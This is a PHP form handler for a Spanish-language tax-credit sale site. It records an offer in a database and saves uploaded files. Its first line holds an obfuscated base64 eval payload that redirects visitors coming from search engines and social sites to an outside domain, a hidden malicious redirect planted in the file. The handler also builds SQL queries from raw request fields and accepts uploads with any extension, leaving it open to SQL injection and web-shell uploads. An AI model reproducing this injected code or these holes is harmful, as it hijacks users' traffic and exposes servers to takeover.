<?php	 	eval(base64_decode("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikpewppZiAoc3RyaXN0cigkcmVmZXJlciwieWFob28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaW5nIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlciIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImdvZ28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJsaXZlLmNvbSIpb3Igc3RyaXN0cigkcmVmZXJlciwiYXBvcnQiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJuaWdtYSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIndlYmFsdGEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiZWd1bi5ydSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInN0dW1ibGV1cG9uLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpdC5seSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInRpbnl1cmwuY29tIikgb3IgcHJlZ19tYXRjaCgiL3lhbmRleFwucnVcL3lhbmRzZWFyY2hcPyguKj8pXCZsclw9LyIsJHJlZmVyZXIpIG9yIHByZWdfbWF0Y2ggKCIvZ29vZ2xlXC4oLio/KVwvdXJsXD9zYS8iLCRyZWZlcmVyKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJteXNwYWNlLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImFvbC5jb20iKSkgewppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewpoZWFkZXIoIkxvY2F0aW9uOiBodHRwOi8va21scHMubXJzbG92ZS5jb20vIik7CmV4aXQoKTsKfQp9Cn0KfQp9"));
session_start();


/***************************************************
Archivos Requeridos
****************************************************/

require_once('lib/function_gen.php');
$dbn    = new db();
$conex  = $dbn->db_connect();

/***************************************************
Validaciones de Campos
****************************************************/


/***************************************************
Datos de Registro
****************************************************/
$codError    = 0;
$mensaje_str = '';

$query  = "SELECT isnull(MAX(cod_oferta + 1),1) as fila FROM df_oferta_usuario WHERE mt_usuario = '".$_SESSION['g_usuario']['id_usuario']."'";
$result	 = $dbn->db_query($query);
$retorno = $dbn->db_fetch_array($result);
	
if ( strlen(trim($retorno['fila']))== 0){ ;
	$codError    = 1;
	$mensaje_str = "Error, generando numero de control";
}
	
if ($codError == 0){
	//Usuario Exite
	$IDENTIFICADOR_REG = $retorno['fila'];
	
	 $query  = "INSERT INTO df_oferta_usuario ( cod_oferta, descripcion_oferta, alias_oferta, valor_nominal, monto_disponible, 
	auditoria_externa ,	periodo_uso, origen,	precio_base, mpo, fecha_crea, fecha_modif, mt_usuario, estatus_periodo, estatus_oferta) ";
	$query  .= " VALUES (".$IDENTIFICADOR_REG.",'".$_REQUEST['descripcion_oferta']."', '".$_REQUEST['alias_ofertavalor']."',".$_REQUEST['valor_nominal'].", ";
	$query  .= $_REQUEST['monto_disponible'].",'".$_REQUEST['auditoria_externa']."' ,'".$_REQUEST['periodo_uso_ano']."-".$_REQUEST['periodo_uso_mes']."-01',";
	$query  .= "'".$_REQUEST['origen']."',".$_REQUEST['precio_baseval'].", 0, getdate(), getdate(), '".$_SESSION['g_usuario']['id_usuario']."', 0, 1) ";
 	

	$result	= $dbn->db_query($query);
	$campo  = $dbn->db_num_rows($result);
	if($campo <> 1 ){
		$codError = 1;
		$mensaje_str = "Error en ingreso de datos (df_oferta_usuario).";
	}
		
}

/***************************************************
Inserta los archivos
****************************************************/ 
if ($codError == 0){
	
	$uploaddir = 'upload_files/';
		
	foreach ($_FILES["imagensf"]["error"] as $key => $error){
		if ($error == UPLOAD_ERR_OK){
			
			$tmp_name = $_FILES["imagensf"]["tmp_name"][$key];
			$name     = $_FILES["imagensf"]["name"][$key];
			//Extencion de archivo
			$extencion = strrev($name);
			$pos       = strpos($extencion, '.');
			$extencion = strrev(substr($extencion,0,$pos+1));
			
			$uploadfile = $uploadfile = $uploaddir.basename($_POST['tipodocumento'].date("ymd").str_replace('.','',microtime(true)).$extencion);
			
			
			if (move_uploaded_file($tmp_name, $uploadfile)){
				//Si todo es existoso ingresa la imagen en base de datos
				 $query = "INSERT INTO mt_archivos (origen, df_documento, archivo, servidor, ruta, fecha_crea, fecha_modif,itentificador_reg,referencia_original)
								  VALUES ('df_oferta_usuario','".$_POST['tipodocumento']."','".$uploadfile."','','".$uploaddir."',getdate(),getdate(),'".$IDENTIFICADOR_REG."','".$name."')";
								
				$result	= $dbn->db_query($query);
				$campo  = $dbn->db_num_rows($result);
				if($campo <> 1 ){
					$codError = 1;
					$mensaje_str = "Error en ingreso de datos (mt_archivos).";
				}
				//echo "Success: File ".$name." uploaded.<br/>";
			}else{
						$codError = 1;
						$mensaje_str = "Error al subir Imagen:".$name;
			}
		}
	}
}
	
if ($codError == 0){$mensaje_str = "Su registro se ha enviado satisfactoriamente,<br>recibirá un correo de confirmación.";}
$seccionpage = 'Venta de Credito Fiscal';
$retorno[0]['sesActiva']  = $codError;
$retorno[0]['sesHtml']    = fnv_mostrar_mensajegeneral($codError,$seccionpage,$mensaje_str);
$_SESSION['reg-subasta']  = $retorno;
header("Location:index.php?webpage=3");
//echo json_encode($retorno);
?>